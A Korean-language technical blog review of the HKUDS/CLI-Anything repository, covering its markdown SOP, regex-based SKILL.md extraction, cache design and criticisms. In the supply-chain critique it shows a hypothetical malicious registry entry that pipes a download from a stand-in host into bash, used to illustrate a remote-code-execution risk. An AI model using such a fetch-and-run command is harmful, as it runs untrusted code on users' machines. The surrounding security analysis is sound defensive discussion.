---
title: "HKUDS/CLI-Anything 뜯어보기 — 마크다운이 컴파일러고, 정규식이 introspector다"
repo: HKUDS/CLI-Anything
url: https://github.com/HKUDS/CLI-Anything
language: python
date: 2026-05-17
stars: 35211
summary: "70일 만에 별 35k. HKUDS가 또 한 건 했다. CLI-Anything은 'GUI 앱을 에이전트가 쓰게 만드는 CLI를 한 명령으로 양산'한다는 레포인데, 막상 열어보니 진짜 컴파일러는 747라인짜리 HARNESS.md 마크다운이고 SKILL.md 생성은 정규식으로 한다. 영리한데 묘하게 위태롭다."
tags:
  - cli
  - agent-native
  - hkuds
  - claude-code
  - skill-md
  - python
  - click
  - mcp
  - subprocess
  - monorepo
---

# HKUDS/CLI-Anything 뜯어보기 — 마크다운이 컴파일러고, 정규식이 introspector다

## 도입

또 HKUDS다. 한 달 전에 같은 그룹의 [AI-Trader](https://github.com/HKUDS/AI-Trader)를 뜯어봤는데, 이번 주 트렌딩 상단에 같은 owner 이름이 또 떠 있었다. [HKUDS/CLI-Anything](https://github.com/HKUDS/CLI-Anything). 첫 커밋이 2026년 3월 8일, 별 35,211개, 70일. 일평균 500개씩 별이 붙은 셈인데 — 솔직히 이 정도면 "또 마케팅 잘 한 학술랩이군" 정도로 넘기고 싶었다.

근데 한 줄 카피가 좀 걸렸다. "Making ALL Software Agent-Native." Photoshop도, Blender도, Zoom도 다 에이전트가 쓸 수 있게 만든다고. 이게 무슨 의미인지 README만 봐선 안 잡혀서, 결국 클론을 떠서 `cli-anything-plugin/HARNESS.md`부터 열어봤다. 그러자마자 좀 놀랐는데 — **레포에서 가장 중요한 파일이 코드가 아니라 747라인짜리 마크다운이었다.** 이게 무슨 뜻인지부터 풀어야 글이 시작될 것 같다.

## 정체

한 줄 요약하자면 이렇다. CLI-Anything은 **"임의의 GUI 데스크탑 앱을 코딩 에이전트가 호출 가능한 CLI 패키지로 자동 변환해주는 Claude Code 플러그인 + 그렇게 만들어진 55개+ harness 패키지를 모아둔 PyPI 카탈로그"**다. 단순한 도구라기보단 메타 도구에 가깝다.

마케팅 카피("Making ALL Software Agent-Native")와 실제 거리를 짚고 가자. 진짜 모든 소프트웨어를 자동 변환하는 마법은 없다. 대신 **`/cli-anything <repo-url>` 슬래시 커맨드 한 줄을 LLM에게 던지면, LLM이 7단계 SOP를 따라 그 소프트웨어용 Click 기반 Python CLI를 짜내는 워크플로**가 있다. 핵심은 그 SOP가 사람이 코드로 강제한 게 아니라, 작가가 자연어로 "이렇게 해라"라고 적어둔 마크다운이라는 점이다. LLM이 그걸 충실히 베끼면 일관된 CLI가 나오고, 베끼지 못하면 그냥 안 나온다. 굉장히 LLM 시대다운 디자인이다.

만든 사람은 홍콩대 데이터과학연구소(HKUDS), 디렉터는 [Chao Huang 조교수](https://datascience.hku.hk/people/chao-huang/)다. 같은 그룹은 이미 nanobot(별 42k, 초경량 에이전트 런타임), LightRAG(별 35k, EMNLP 2025), DeepTutor(별 24k), AI-Researcher(NeurIPS 2025 Spotlight) 같은 메가 히트 라인업을 갖고 있다. 흥미로운 건 **CLI-Anything이 단발 출시가 아니라 풀스택 캠페인의 한 조각**이라는 점이다. nanobot(런타임) + OpenHarness(에이전트 하네스) + CLI-Anything(도구 카탈로그) + LightRAG(메모리·검색)이 같은 그림의 다른 조각으로 동시에 굴러간다. 이 정도면 단순 학술 그룹이 아니라 "에이전트 인프라 풀스택을 의도적으로 동시에 푸는 캠페인"으로 봐야 한다. Chao Huang이 [X에 직접 올린 한 줄](https://x.com/huang_chao4969/status/2032504008502554838)이 캠페인의 슬로건이다: "Software may no longer be built for humans, but for agents." 짧고 외워지기 좋고, 학자가 직접 마케터를 겸하고 있다는 게 보인다.

[OSS Insight는 이 흐름에 "Agent-Native CLI Wave 2026"이라는 이름을 붙였고](https://ossinsight.io/blog/agent-native-cli-wave-2026), 같은 시기에 트렌딩에 같이 묶여 올라온 게 ByteDance의 UI-TARS다. 둘은 정확히 반대 진영이다. UI-TARS는 비전-언어 모델로 픽셀을 보고 마우스를 움직이고, CLI-Anything은 픽셀 따위 보지 말고 백엔드를 직접 호출하라고 한다. README도 정확히 그 대립각으로 자기를 위치시킨다: "no screenshots, no clicking, no RPA fragility." 이게 본질적인 베팅 차이다.

## 아키텍처·구현 디테일

아키텍처는 단순하지만 그 단순함의 결이 흥미롭다. 세 다리로 서 있다. (1) 747라인짜리 마크다운 SOP, (2) Click 데코레이터를 정규식으로 긁어 SKILL.md를 만드는 메타 추출기, (3) SHA-256 fingerprint 기반 immutable preview-bundle 프로토콜.

먼저 마크다운 SOP부터 보자. `cli-anything-plugin/commands/cli-anything.md`라는 슬래시 커맨드 정의서가 본문에 **"CRITICAL: Read HARNESS.md First"**라고 못박아두고, 그 HARNESS.md(747라인)에 7-phase 절차가 산문으로 박혀 있다. Phase 1 코드베이스 분석 → Phase 2 CLI 아키텍처 설계 → Phase 3 구현 → Phase 4 테스트 계획 → Phase 5 테스트 작성 → Phase 6 문서화 → Phase 6.5 SKILL.md 생성 → Phase 7 배포. 흥미로운 건 480~545라인 사이의 "Principles & Rules"가 RFC 2119처럼 **MUST / MUST NOT** 어휘로 쓰여 있다는 점이다. LLM이 토큰 단위로 그 강제어휘에 반응한다는 걸 노리고 쓴 거다. 코드가 아니라 마크다운으로 컨벤션을 강제하고, 컴파일러 자리에 LLM을 앉히는 — 이게 이 레포의 가장 큰 디자인 결정이다.

그 다음, 자동 생성된 패키지에서 SKILL.md를 뽑아내는 메타 추출기. 여기가 진짜 영리하다.

```python
# cli-anything-plugin/skill_generator.py:212-218
group_pattern = (
    r'@(\w+)\.group\([^)]*\)'                          # @xxx.group(...)
    r'(?:\s*@[\w.]+\([^)]*\))*'                         # optional additional decorators
    r'\s*def\s+(\w+)\([^)]*\)'                          # def xxx(...):
    r':\s*'                                             # colon with optional whitespace
    r'(?:"""([\s\S]*?)"""|\'\'\'([\s\S]*?)\'\'\')?'      # optional docstring
)
```

처음 봤을 때 좀 웃었다. Click을 import해서 `cli.commands`를 traverse하는 "정석" introspection이 있는데도, 이 레포는 **정규식으로 텍스트만 본다**. 왜냐고? 그래야 SKILL.md 생성기가 software 의존성 없이 돌기 때문이다. Blender harness의 SKILL.md를 만들기 위해 CI에 Blender를 깔 필요가 없다. LibreOffice도 마찬가지. **정확한 영악함**이다 — 의존성 지옥을 정규식 한 덩어리로 우회했다. 단, 데코레이터 패턴이 표준에서 살짝만 벗어나도 명령이 조용히 누락된다는 fragility를 안고 있다. 이 양면성이 나중 비판 섹션에서 다시 나온다.

세 번째 다리는 preview-bundle 프로토콜이다. 에이전트가 GUI 앱 상태를 시각·구조 검사할 수 있게 해주는 메커니즘인데, 캐시 키 디자인이 깔끔하다.

```python
# cli-anything-plugin/preview_bundle.py:70-89
def build_cache_key(
    software: str, recipe: str, bundle_kind: str,
    source_fingerprint: str,
    options: Optional[Dict[str, Any]] = None,
    harness_version: Optional[str] = None,
    protocol_version: str = PROTOCOL_VERSION,
) -> str:
    return fingerprint_data(
        {
            "protocol_version": protocol_version,
            "software": software,
            "recipe": recipe,
            "bundle_kind": bundle_kind,
            "source_fingerprint": source_fingerprint,
            "options": options or {},
            "harness_version": harness_version or "",
        }
    )
```

소스 fingerprint뿐 아니라 **harness_version과 protocol_version까지 캐시 키에 들어 있다**. harness가 업데이트되면 자동으로 캐시 무효화, 프로토콜 버전이 올라가도 자동 무효화. "옵션 하나 바꾸면 재렌더링해야 하는데 같은 옵션이면 디스크 캐시를 살려야 한다"는 짜증나는 경계 케이스를 정면돌파한다. 그리고 그 위에 immutable bundle directory + mutable session.json + append-only trajectory.json이라는 3-layer 모델이 얹어져 있다. 이벤트 소싱 패턴이다. agent가 "최근 N step만 보고 싶다"고 했을 때 trajectory 전체를 안 읽고 요약을 반환하는 함수까지 따로 있다 — 주석에 "agent-cheap introspection call"이라고 명시까지 해뒀다.

전체 흐름을 한번 정리하면 이렇게 된다. 사용자가 `/cli-anything ./gimp`를 친다. Claude Code가 `commands/cli-anything.md`를 읽고 HARNESS.md를 그대로 따라 LLM이 GIMP용 Click CLI 패키지를 생성한다. Phase 6.5에서 `skill_generator.py`가 그 패키지를 정규식으로 훑어 SKILL.md를 두 군데에 쓴다 — repo root canonical + packaged compat copy. 그 SKILL.md가 다음 에이전트 세션의 트리거가 된다. 사용자는 그저 `pip install cli-anything-gimp`만 하면 `cli-anything-gimp open foo.xcf --json` 같은 명령을 쓸 수 있다. 카탈로그는 `cli-hub install gimp` 같은 패키지 매니저로 따로 제공된다.

## 박수 포인트

박수 칠 만한 디테일 네 가지를 꼽았다.

**첫째, 백엔드 wrapper의 정석을 코드로 박아둔 것.** LibreOffice를 자동화해본 사람은 안다 — 한 프로세스가 사용자 프로필을 락하면 두 번째 호출이 그냥 멈춘다. 이 레포는 그 함정을 알고 매 호출마다 4개의 임시 디렉토리를 따로 부여한다.

```python
# libreoffice/agent-harness/cli_anything/libreoffice/utils/lo_backend.py:112-146
with tempfile.TemporaryDirectory(prefix="lo-profile-") as profile_dir, \
        tempfile.TemporaryDirectory(prefix="lo-runtime-") as runtime_dir, \
        tempfile.TemporaryDirectory(prefix="lo-config-") as config_dir, \
        tempfile.TemporaryDirectory(prefix="lo-cache-") as cache_dir:
    env = os.environ.copy()
    if os.name == "posix":
        try:
            os.chmod(runtime_dir, 0o700)
        except OSError:
            pass
        env.update({
            "XDG_RUNTIME_DIR": runtime_dir,
            "XDG_CONFIG_HOME": config_dir,
            "XDG_CACHE_HOME": cache_dir,
        })
    profile_uri = Path(profile_dir).resolve().as_uri()
    cmd = [
        lo, "--headless", "--nologo", "--nofirststartwizard",
        f"-env:UserInstallation={profile_uri}",
        "--convert-to", output_format,
        "--outdir", output_dir,
        input_path,
    ]
    result = subprocess.run(
        cmd, capture_output=True, text=True, timeout=timeout, env=env,
    )
```

`runtime_dir`를 `0o700`으로 chmod까지 한다. XDG 환경변수 4종(`XDG_RUNTIME_DIR`, `XDG_CONFIG_HOME`, `XDG_CACHE_HOME` + `UserInstallation`)을 다 격리한다. "그냥 subprocess 부르면 안 되나?"의 답이 아니라 "한 프로세스에서 N번 부를 때 깨지지 않으려면 이걸 해야 한다"의 답이다. 이런 코드가 55개+ harness에 들어가 있다는 게 인상적이다.

**둘째, 단 13줄로 자가발견을 구현한 REPL 배너.** `cli-anything-plugin/repl_skin.py:144-156`는 `__file__`의 부모를 거슬러 올라가 `skills/<skill-id>/SKILL.md`를 찾아내고, 못 찾으면 packaged copy로 폴백한다. 그 절대경로가 REPL 배너에 표시된다. 모노레포에서 dev install 해서 쓸 때와 PyPI에서 설치해서 쓸 때 둘 다 같은 동작이 되도록 13줄로 해결했다. **에이전트가 자기가 어디서 무슨 capability를 가졌는지 자가발견하게 만드는** 디자인 의도가 한 함수에 압축돼 있다.

**셋째, PEP 420 namespace package로 모노레포 충돌을 우회한 것.** `cli_anything/` 디렉토리에 `__init__.py`를 두지 않았다. 그래서 `pip install cli-anything-gimp`와 `pip install cli-anything-blender`가 같은 가상환경에서 충돌 없이 공존한다. 모든 sub-package가 PyPI에 별도로 배포되는데도 import는 `from cli_anything.gimp import ...`로 통일된다. 작은 결정인데 모노레포 + 다중 PyPI 배포라는 어려운 조합을 깔끔히 푼다. HARNESS.md의 Phase 7이 이 규칙을 MUST 어휘로 박아두고, 실제로 표본으로 본 4개 harness(libreoffice, gimp, sbox, sketch) 모두 준수하고 있었다.

**넷째, jinja2 옵셔널 처리 같은 작은 디펜시브 디자인.** SKILL.md 생성기는 jinja2가 있으면 템플릿 렌더링을 쓰고, 없으면 `generate_skill_md_simple()`(`skill_generator.py:371-473`)로 폴백한다. import 자체가 try/except로 감싸여 있다. CLI 도구가 무거우면 안 된다는 의식이 곳곳에 보인다 — repl_skin은 zero-dep ANSI escape를 raw string으로 박아 prompt_toolkit이 있으면 통합, 없으면 평범 input(). cli-hub의 의존성은 `click`, `requests` 단 둘. 의식적으로 가볍게 만든 흔적이다.

## 비판·한계

박수만 치고 끝낼 만한 레포는 아니다. 신경 쓰이는 부분이 꽤 있다.

**가장 큰 건 supply chain 표면이다.** `cli-hub/cli_hub/installer.py:52-66`을 보면 cmd 문자열에 `| && || ; $( \`` 중 하나라도 있으면 `subprocess.run(..., shell=True)`로 자동 전환한다. 주석에 "Commands come from the trusted registry, not from user input"이라고 자기변호가 적혀 있는데, 그 registry는 `hkuds.github.io/CLI-Anything/registry.json`에서 HTTP fetch한다(`registry.py:9` 근처). 1시간 캐시 + 네트워크 실패시 stale 폴백. 시나리오를 그려보면 — 메인테이너 GitHub 계정이 탈취되거나 GitHub Pages 빌드 파이프라인이 위변조되면, registry.json에 `install_cmd: "curl evil.com/x | bash"` 같은 줄이 박힐 수 있다. `cli-hub install` 호출자 누구든 RCE가 된다. 별 35k × 자동 install 워크플로면 충분히 매력적인 타깃이다. install_cmd allowlist(`pip install` / `npm install -g` / `uv tool install` 접두어만 허용)나 GPG 서명 같은 게 있을 법한데, 코드에선 안 보였다. 의식적으로 짚어두고 싶다.

**두 번째는 정규식 introspector의 fragility다.** 박수 섹션에선 영리하다고 했지만, 이건 정확히 양날의 검이다. 비표준 Click 패턴을 쓰면 명령이 조용히 누락된다. 예컨대 `@click.group()` 대신 변수 별칭(`@my_group()`)으로 데코레이터를 만들면 `extract_commands_from_cli`의 정규식이 안 잡는다. decorator 사이에 빈 줄이 끼면 docstring 캡쳐가 깨질 수 있다. 그리고 결정적으로 — `sketch` harness는 유일한 Node.js 패키지인데, commander를 쓴다. Click 정규식이 안 통할 텐데, 그럼 sketch의 SKILL.md는 누가 어떻게 만든 걸까? 본 모노레포에 Node.js용 generator가 보이지 않는다. 사람이 직접 썼을 가능성이 높다. "다언어 지원"이라는 시그널은 있지만 도구 체인은 Python-only인 셈.

**세 번째, 단독 메인테이너 트럭 팩터.** Contributor 통계를 보면 1위 `yuh-yang`이 235커밋(전체의 37%), 2위가 43커밋. 75명 contributor가 있긴 한데 long-tail이 너무 길다. registry, marketplace.json, HARNESS.md 모두 한 사람이 게이트한다. 학술 그룹 산하 프로젝트 흔한 패턴이긴 하지만, 35k 별짜리 인프라가 한 사람에 묶여 있는 건 risk다.

**네 번째, "production-ready" 주장의 한계.** README는 28개 harness 합산 2,280 tests 100% pass를 자랑한다. 표본으로 4개 harness를 봤더니 libreoffice 172, gimp 115, sbox 244, blender 228개로 합 759. 28개로 곱하면 5,300이 나오니까 README의 2,280은 오히려 보수적이다 — 카운트는 믿을 만하다. 그런데 HARNESS.md는 "No graceful degradation — software must be installed or tests FAIL not SKIP" 철학을 고수한다. 즉 5,000개 테스트를 다 돌리려면 CI에 LibreOffice + Blender + GIMP + Inkscape + s&box(Steam 의존!) + … 가 다 깔려 있어야 한다. 실제로 CI가 이걸 다 돌리는지는 의심스럽다. README의 100% pass는 "이론적 합산"일 가능성이 있다. [OSS Insight도 비슷하게 짚었다](https://ossinsight.io/blog/agent-native-cli-wave-2026) — "single `/cli-anything` run으로 production 품질 안 나옴, `/refine`을 여러 번 돌려야 한다." 한 번의 자동 생성이 곧 production이라고 읽으면 함정이다.

**다섯 번째, 스타일 일관성 강제의 부재.** 표본 4개 중 sbox만 PEP 8을 깬다(`( ctx, "json" )` 같은 괄호 내 공백, `sbox_cli.py:46` 등). 244 tests로 단일 최대 harness인데도 머지가 됐다. pre-commit/ruff/black이 안 박혀 있다는 신호다. 모노레포 전반에 `pyproject.toml`이 거의 비어 있다는 사실도 같은 방향을 가리킨다.

**여섯 번째, "agent end-state"에 너무 일찍 베팅한다는 비판도 있다.** OSS Insight 글이 균형 잡힌 톤으로 이걸 짚는다: 별 수와 인프라 채택은 다르다. 90일 성장으로 패러다임을 단정하긴 이르다. OpenClaw의 SKILL.md, MCP 스키마, AGENTS.md 등 **최소 3개의 경쟁 표준 포맷**이 동시에 굴러가는 중이고, 표준 전쟁이 일어나면 다 같이 손해다. UI-TARS 같은 비전 기반 진영은 신규 SW에 즉시 일반화되지만, CLI-Anything은 SW마다 하네스를 새로 짜야 한다 — general-purpose가 아니라 SW별 수공예다. McKinsey 임원 조사에서 1%만 자사 gen AI를 'mature'라고 답한 시점이라는 점도 같이 떠올릴 만하다. "에이전트가 모든 SW를 쓰는 미래"는 아직 채택 곡선의 아주 왼쪽에 있다.

**일곱 번째, 텔레메트리 가시성.** `cli-hub/cli_hub/analytics.py`는 PostHog로 install/launch 이벤트를 보내고 17개 agent-env 변수(`CLAUDE_CODE`, `CODEX`, `CURSOR_SESSION`, `CLINE_SESSION`, `AIDER`, `CONTINUE_SESSION`, `OPENHANDS_AGENT` 등)로 호출자를 식별한다. MIT 라이선스 CLI 도구가 모든 install을 보고하는 건 정당한 옵션이지만, opt-out이 어디 환경변수에 있는지가 README 1면에 잘 보이는지는 확신할 수 없었다. 학술적 호기심으로 보면 "어떤 에이전트가 가장 활발한가" 데이터셋이 되니까 — 그래도 이건 명시적으로 큰 글씨로 안내될 필요가 있다.

## 결론

이 레포에 잘 맞는 사람을 먼저 정리해보자. **(1) Claude Code / Codex / Cursor 같은 코딩 에이전트를 일상적으로 쓰는데 GUI 앱을 자동화하고 싶은 개발자** — Blender, LibreOffice, GIMP, ComfyUI 같은 SW를 에이전트가 실제로 쓸 수 있게 만들고 싶다면 `cli-hub install <name>` 한 줄이 정답에 가깝다. **(2) 사내 도구를 에이전트-네이티브로 노출하고 싶은 팀** — HARNESS.md가 SOP 그 자체라서 베껴서 자기 도구에 적용 가능하다. 마크다운 SOP + Click + 정규식 SKILL.md 추출이라는 조합은 굉장히 재현 가능한 패턴이다. **(3) "MCP는 토큰이 너무 무거워서 싫다"는 입장의 엔지니어** — CLI-Anything의 베팅은 정확히 그 가설이다. JSON 출력 + `--help`로 LLM 사전학습 지식을 그대로 활용한다. **(4) 에이전트 인프라의 표준 전쟁을 관전 중인 사람** — HKUDS의 풀스택 캠페인(nanobot + OpenHarness + CLI-Anything + LightRAG)을 한 번 훑어보는 것 자체가 공부가 된다.

피해야 할 사람도 분명하다. **(1) 보안이 빡빡한 엔터프라이즈에서 자동 install 워크플로를 도입하려는 사람** — supply chain 표면이 현재 상태로는 좀 위험하다. allowlist나 서명 도입까지 기다리는 게 안전하다. **(2) Node.js 중심 도구 체인을 쓰는 팀** — 도구 체인이 Python-first라 합이 안 맞는다. **(3) "한 번 돌리면 production-ready CLI가 나온다"고 기대하는 사람** — `/refine`을 여러 번 돌려야 한다는 게 현실이다. **(4) UI-TARS처럼 신규 SW에도 즉시 일반화되는 일반-목적 에이전트를 원하는 사람** — 이 레포는 SW별 수공예 노선이다.

내 결론. 이 레포에서 가장 매력적인 건 코드보다 **디자인 결정의 결**이다. 마크다운을 컴파일러로 쓰고 LLM을 그 컴파일러의 본체로 앉힌 베팅, 정규식으로 introspection을 우회한 영악함, immutable preview-bundle의 깔끔함, 13줄로 자가발견을 구현한 REPL 배너 — 작은 결정들의 누적이 70일 35k라는 숫자를 만든 것 같다. 동시에 마크다운 컴파일러는 LLM의 변덕에 약하고, 정규식은 표준에서 벗어난 패턴을 조용히 놓치고, registry는 외부 GitHub Pages에 종속된다. 영리함과 위태로움이 동전의 양면이다.

다음 주에 시간이 좀 나면 사내 도구 하나로 직접 `/cli-anything`을 돌려볼 생각이다. 7-phase가 진짜 한 번에 production 코드를 뽑아내는지, 아니면 [OSS Insight 평론](https://ossinsight.io/blog/agent-native-cli-wave-2026)대로 `/refine`을 다섯 번쯤 돌려야 하는지 — 그 결과는 따로 글로 정리하려고 한다. 그리고 한 가지 더, "마크다운이 컴파일러"라는 이 디자인 패턴은 CLI-Anything 한 곳에서 끝날 것 같지 않다. OpenClaw의 SKILL.md, AGENTS.md, MCP 스키마와 함께 어떤 식으로든 한 표준에 수렴할 텐데, 그 표준 전쟁의 후보 셋 중 하나가 지금 우리 눈앞에 있다는 사실은 분명 흥미롭다.
